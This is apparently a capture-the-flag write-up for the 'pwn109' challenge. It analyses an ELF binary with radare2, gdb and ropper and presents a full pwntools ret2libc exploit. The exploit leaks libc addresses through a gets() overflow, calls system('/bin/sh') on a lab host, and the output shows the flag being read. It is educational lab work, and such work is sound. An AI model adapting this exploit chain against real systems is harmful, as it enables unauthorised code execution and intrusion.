# pwn109

```bash
$ ls
pwn109

$ file pwn109 
pwn109: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7a64987fd8eb1e96bd9178b4453cd80e78cbe0bb, for GNU/Linux 3.2.0, not stripped

$ checksec --file=pwn109
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

$ rabin2 -l pwn109 
libc.so.6

$ rabin2 -i pwn109 
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00401060 GLOBAL FUNC       puts
2   ---------- GLOBAL FUNC       __libc_start_main
3   ---------- WEAK   NOTYPE     __gmon_start__
4   0x00401070 GLOBAL FUNC       gets
5   0x00401080 GLOBAL FUNC       setvbuf

```

## Binary Analisys

`radare2`

```text
[0x004011f2]> afl
0x00401060    1     11 sym.imp.puts
0x00401070    1     11 sym.imp.gets
0x00401080    1     11 sym.imp.setvbuf
0x00401090    1     46 entry0
0x004010d0    4     31 sym.deregister_tm_clones
0x00401100    4     49 sym.register_tm_clones
0x00401140    3     32 entry.fini0
0x00401170    1      6 entry.init0
0x004012b0    1      5 sym.__libc_csu_fini
0x004012b8    1     13 sym._fini
0x004011db    1     23 sym.banner
0x00401240    4    101 sym.__libc_csu_init
0x004010c0    1      5 sym._dl_relocate_static_pie
0x004011f2    1     64 main
0x00401176    1    101 sym.setup
0x00401000    3     27 sym._init
0x00401030    2     28 fcn.00401030
0x00401040    1     15 fcn.00401040
0x00401050    1     15 fcn.00401050

[0x00401090]> s main 
[0x004011f2]> pdfr
  ; ICOD XREF from entry0 @ 0x4010b1(r)
┌ 64: int main (int argc, char **argv, char **envp);
│ afv: vars(1:sp[0x28..0x28])
│ 0x004011f2      f30f1efa       endbr64
│ 0x004011f6      55             push rbp
│ 0x004011f7      4889e5         mov rbp, rsp
│ 0x004011fa      4883ec20       sub rsp, 0x20
│ 0x004011fe      b800000000     mov eax, 0
│ 0x00401203      e86effffff     call sym.setup
│ 0x00401208      b800000000     mov eax, 0
│ 0x0040120d      e8c9ffffff     call sym.banner
│ 0x00401212      488d3d070f..   lea rdi, str.This_time_no             ; 0x402120 ; "This time no \U0001f5d1\ufe0f \U0001f92b & \U0001f408\U0001f6a9.\U0001f4c4 Go ahead \U0001f60f" ; const char *s
│ 0x00401219      e842feffff     call sym.imp.puts                     ; int puts(const char *s)
│ 0x0040121e      488d45e0       lea rax, [s]
│ 0x00401222      4889c7         mov rdi, rax                          ; char *s
│ 0x00401225      b800000000     mov eax, 0
│ 0x0040122a      e841feffff     call sym.imp.gets                     ; char *gets(char *s)
│ 0x0040122f      90             nop
│ 0x00401230      c9             leave
└ 0x00401231      c3             ret

[0x004011f2]> afv
var char * s @ rbp-0x20

```

The *main* is **Buffer Overflow Vulnerability**.

There are no interesting functions to exploit. The idea is to try to leak the LIBC address to launch a `system("/bin/sh")`.

```text
[0x004011f2]> iS
nth paddr        size vaddr       vsize perm flags type        name
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- 0x0   NULL
1   0x00000318   0x1c 0x00400318   0x1c -r-- 0x2   PROGBITS    .interp
2   0x00000338   0x20 0x00400338   0x20 -r-- 0x2   NOTE        .note.gnu.property
3   0x00000358   0x24 0x00400358   0x24 -r-- 0x2   NOTE        .note.gnu.build-id
4   0x0000037c   0x20 0x0040037c   0x20 -r-- 0x2   NOTE        .note.ABI-tag
5   0x000003a0   0x30 0x004003a0   0x30 -r-- 0x2   GNU_HASH    .gnu.hash
6   0x000003d0   0xd8 0x004003d0   0xd8 -r-- 0x2   DYNSYM      .dynsym
7   0x000004a8   0x5e 0x004004a8   0x5e -r-- 0x2   STRTAB      .dynstr
8   0x00000506   0x12 0x00400506   0x12 -r-- 0x2   GNU_VERSYM  .gnu.version
9   0x00000518   0x20 0x00400518   0x20 -r-- 0x2   GNU_VERNEED .gnu.version_r
10  0x00000538   0x78 0x00400538   0x78 -r-- 0x2   RELA        .rela.dyn
11  0x000005b0   0x48 0x004005b0   0x48 -r-- 0x42  RELA        .rela.plt
12  0x00001000   0x1b 0x00401000   0x1b -r-x 0x6   PROGBITS    .init
13  0x00001020   0x40 0x00401020   0x40 -r-x 0x6   PROGBITS    .plt
14  0x00001060   0x30 0x00401060   0x30 -r-x 0x6   PROGBITS    .plt.sec
15  0x00001090  0x225 0x00401090  0x225 -r-x 0x6   PROGBITS    .text
16  0x000012b8    0xd 0x004012b8    0xd -r-x 0x6   PROGBITS    .fini
17  0x00002000  0x158 0x00402000  0x158 -r-- 0x2   PROGBITS    .rodata
18  0x00002158   0x54 0x00402158   0x54 -r-- 0x2   PROGBITS    .eh_frame_hdr
19  0x000021b0  0x140 0x004021b0  0x140 -r-- 0x2   PROGBITS    .eh_frame
20  0x00002e10    0x8 0x00403e10    0x8 -rw- 0x3   INIT_ARRAY  .init_array
21  0x00002e18    0x8 0x00403e18    0x8 -rw- 0x3   FINI_ARRAY  .fini_array
22  0x00002e20  0x1d0 0x00403e20  0x1d0 -rw- 0x3   DYNAMIC     .dynamic
23  0x00002ff0   0x10 0x00403ff0   0x10 -rw- 0x3   PROGBITS    .got
24  0x00003000   0x30 0x00404000   0x30 -rw- 0x3   PROGBITS    .got.plt
25  0x00003030   0x10 0x00404030   0x10 -rw- 0x3   PROGBITS    .data
26  0x00003040    0x0 0x00404040   0x30 -rw- 0x3   NOBITS      .bss
27  0x00003040   0x2a 0x00000000   0x2a ---- 0x30  PROGBITS    .comment
28  0x00003070  0x690 0x00000000  0x690 ---- 0x0   SYMTAB      .symtab
29  0x00003700  0x239 0x00000000  0x239 ---- 0x0   STRTAB      .strtab
30  0x00003939  0x11f 0x00000000  0x11f ---- 0x0   STRTAB      .shstrtab

```

Since the *puts* and *gets* dependencies are resolved in the **main**, the idea is to exploit the **Buffer Overflow Vulnerability** to leak the memory address of the puts function:

- `puts@plt(puts@got)`

Then, we re-execute the *main* function in order to exploit the BOF again and use the leaked address from the previous stage::

- system@LIBC("/bin/sh"@LIBC)

`gdb`

```text
pwndbg> break* main
pwndbg> run

pwndbg> got -r
State of the GOT of /tmp/pwn109/pwn109:
GOT protection: Partial RELRO | Found 5 GOT entries passing the filter
[0x403ff0] __libc_start_main@GLIBC_2.2.5 -> 0x7ffff7c29dc0 (__libc_start_main) ◂— endbr64 
[0x403ff8] __gmon_start__ -> 0
[0x404018] puts@GLIBC_2.2.5 -> 0x401030 ◂— endbr64 
[0x404020] gets@GLIBC_2.2.5 -> 0x401040 ◂— endbr64 
[0x404028] setvbuf@GLIBC_2.2.5 -> 0x401050 ◂— endbr64 

pwndbg> plt
Section .plt 0x401020 - 0x401060:
No symbols found in section .plt
Section .plt.sec 0x401060 - 0x401090:
0x401060: puts@plt
0x401070: gets@plt
0x401080: setvbuf@plt

```

```bash
$ ropper --file pwn109 --search pop 
0x00000000004012a3: pop rdi; ret; 

```

Stack Alignment utils:

```bash
$ ropper --file pwn109 --search ret
0x000000000040101a: ret;
```

### Remote Exploitation

Leak two addresses to discover the libc.

Using the LSB of the leaked address, discover the libc by db.

> [https://libc.blukat.me/?q=puts%3Aaa0%2Cgets%3A190&l=libc6_2.27-3ubuntu1.4_amd64](https://libc.blukat.me/?q=puts%3Aaa0%2Cgets%3A190&l=libc6_2.27-3ubuntu1.4_amd64)

Below is the `exploit` script built for *debugging*, *local* and *remote* exploitation.

```python
#!/usr/bin/env python3 
from pwn import context, ELF, gdb, process, remote, p64, u64, info

exe = './pwn109'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

gdbinit='''
init-pwndbg
break* main
# main@ nop; leave; ret
break* main+61
continue
'''

REMOTE, PORT = '10.10.17.148', 9009

#io=gdb.debug([exe], gdbscript=gdbinit)
#io=process([exe])
io=remote(REMOTE, PORT)

padding='A'*32 + 'B'*8

### Stage 1: Leak the LIBC
puts_plt = 0x401060
puts_got = 0x404018
gets_got = 0x404020
pop_rdi_ret = 0x4012a3
main = 0x4011f2

payload = padding.encode() + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(pop_rdi_ret) + p64(gets_got) + p64(puts_plt) + p64(main)

# Send after the ` Go ahead 😏\n`
io.sendlineafter('\x20\x47\x6f\x20\x61\x68\x65\x61\x64\x20\xf0\x9f\x98\x8f\x0a', payload)

puts_libc=u64(io.recvline()[:-1].ljust(8, b'\x00'))

gets_libc=u64(io.recvline()[:-1].ljust(8, b'\x00'))

info(f'puts@LIBC: {hex(puts_libc)}')
info(f'gets@LIBC: {hex(gets_libc)}')

## Local
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
# puts_libc_offset=0x080e50
# libc_base=puts_libc-puts_libc_offset

## Remote
libc_base=puts_libc-0x080aa0
system_libc=libc_base+0x04f550 # 0x050d70
_bin_sh_libc=libc_base+0x1b3e1a #0x1d8678

info(f"libc base: {hex(libc_base)}")
info(f"system: {hex(system_libc)}")
info(f"/bin/sh: {hex(_bin_sh_libc)}")

### Stage 2: ret2LIBC

ret=0x40101a

payload = padding.encode() + p64(ret) + p64(ret) + p64(pop_rdi_ret) + p64(_bin_sh_libc) + p64(system_libc)

# Send after ` Go ahead 😏\n`
io.sendlineafter('\x20\x47\x6f\x20\x61\x68\x65\x61\x64\x20\xf0\x9f\x98\x8f\x0a',payload)

io.interactive()

```

```bash
$ ./exploit

[*] puts@LIBC: 0x7f85d41f5aa0
[*] gets@LIBC: 0x7f85d41f5190
[*] libc base: 0x7f85d4175000
[*] system: 0x7f85d41c4550
[*] /bin/sh: 0x7f85d4328e1a
[DEBUG] Sent 0x51 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  42 42 42 42  42 42 42 42  1a 10 40 00  00 00 00 00  │BBBB│BBBB│··@·│····│
    00000030  1a 10 40 00  00 00 00 00  a3 12 40 00  00 00 00 00  │··@·│····│··@·│····│
    00000040  1a 8e 32 d4  85 7f 00 00  50 45 1c d4  85 7f 00 00  │··2·│····│PE··│····│
    00000050  0a                                                  │·│
    00000051
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x19 bytes:
    b'flag.txt\n'
    b'pwn109\n'
    b'pwn109.c\n'
flag.txt
pwn109
pwn109.c
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x2c bytes:
    b'THM{w417_h0w_Y0u_l3ked_i7_w1th0uT_pr1ntF??}\n'
THM{w417_h0w_Y0u_l3ked_i7_w1th0uT_pr1ntF??}

```

GG :3

---
